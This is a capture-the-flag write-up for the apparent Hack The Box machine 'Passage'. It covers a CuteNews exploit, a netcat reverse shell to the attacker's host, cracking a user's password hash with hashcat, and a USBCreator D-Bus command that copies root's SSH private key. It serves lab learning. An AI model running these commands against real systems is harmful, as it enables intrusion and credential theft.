This box was made by my buddy @ChefByzen on Twitter, I know him from our Uni CTF team. Very cool box!

Let's get into it.
I started off by enumerating like usual with NMAP
```

```

Not much is open so I decided to check out the site
Immediately I see that they have fail2ban and another user kim switft

```
**Implemented Fail2Ban**

Due to unusally large amounts of traffic, View & Comment
Phasellus tristique urna
12 Jun 2020 By Kim Swift 0 Comments
Sed felis pharetra, nec sodales diam sagittis. View & Comment 
```

So gobuster is out of the question to enumerate directories.
I set out to investigate the site manually by playing around and I saw that it is powered by cutenews
After searching around I came across two exploits for it. 
One was metasploit and the other someone had written a python script for after the box was released.
The author of the box says that the intended route is with metasploit.

In either case you get a shell as www-data, we can't get the flag just yet. We have to escalate privileges to get the user flag. 

![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/PassageHTB/cutenews.png)

First order of business was making this a reverse shell cause I can't stand that default shell.
I ran nc -lnvp 9827 on my host kali machine and nc 10.10.**.** 9827 -e /bin/bash on the passage box

--------------------------

PRO TIP: RUN THESE FOR AN ENJOYABLE EXPERIENCE IN YOUR SHELL
```
python -c 'import pty;pty.spawn("/bin/bash");'
```
then
```
[CTRL-Z]
stty raw -echo;fg
[ENTER][ENTER]

source /etc/skel/.bashrc 
export TERM=screen-256color
```
END OF PRO TIP 

--------------------

At this point I got lost, that was until until I dig deeper and found /var/www/html/CuteNews/cdata.
In this directory I fell into a rabbithole of writing a python script to base64 decode the hashes inside of these many files
![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/PassageHTB/base64.png)

For example, inside of one of those php files 
![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/PassageHTB/1stphp.png)
has the first line as garbage and the second line being a base64 string. 
This script turned out to be for naught as the actual way to escalate privileges can be found inside the **Lines** file. 
![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/PassageHTB/lines.png)
if you go through and decode them you come across one that says paul@passage.htb which is one of the two users I found when I was enumerating the home directory
![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/PassageHTB/homedir.png)

Then we throw that hash we found into a hash analyzer and realize it's sha-256, well we could give it a shot cracking that hash to get his password.
![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/PassageHTB/analyzer.png)

We could easily enough crack it with hashcat but this online service did it in less than a second.
![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/PassageHTB/hashcrack.png)
If you want to take a more manual approach with hashcat yourself you could do it with 
```
hashcat -m 1400 paul.txt /usr/share/wordlists/rockyou.txt
```
at any rate you get atlanta1 as the password for paul
I enumerated as paul for a while until I eventually went into the .ssh dir and cated it all out,
I saw that nadav was in the authorized keys so while logged into paul I SSHd into nadav. 
![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/PassageHTB/sshNadav.png)

Now out of all the privilege escalation i did for this box going from nadav to root was by far the hardest.
I always start out running a script that gives me a quick overview of the entire box very easily in case there's something i can spot out of place. In this case it didn't help all too much and I was left to exploring on my own

fail2ban, zeitgeist, and CUPS were the first processes that I investigated but I didn't come to any solution. I finally stumbled upon

```
/usr/bin/python3 /usr/share/usb-creator/usb-creator-helper
```
While looking at all the running processes. 
I don't remember having seen this before so I googled it and came across this article 
https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
They describe how to exploit this to copy files to other 
```
gdbus call --system --dest com.ubuntu.USBCREATOR --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true
```
This copies the root rsa key to /tmp/pwn on my box. 
then we 
```
chmod 600 root_id_rsa 
ssh -i root_id_rsa root@10.10.10.206
```
And you can access root.txt
Thanks for reading!
